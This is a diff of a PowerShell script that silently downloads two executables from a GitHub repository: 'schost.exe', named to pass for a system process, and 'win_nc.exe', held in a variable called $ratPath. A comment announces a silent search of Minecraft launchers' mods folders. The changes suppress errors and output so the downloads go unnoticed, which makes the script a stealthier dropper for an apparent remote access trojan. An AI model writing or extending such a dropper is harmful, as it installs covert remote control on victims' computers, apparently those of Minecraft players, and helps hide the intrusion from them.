@@ -14,10 +14,10 @@ New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
 Write-Host "[3/7]" -ForegroundColor Cyan
 $schostPath = "$workDir\schost.exe"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/schost.exe" -OutFile $schostPath
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/schost.exe" -OutFile $schostPath -ErrorAction SilentlyContinue > $null 2>&1
 
 $ratPath = "$workDir\win_nc.exe"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath  -ErrorAction SilentlyContinue > $null 2>&1
 
 
 # --- Buscar todas las carpetas 'mods' en los launchers de Minecraft (SILENCIOSO) ---
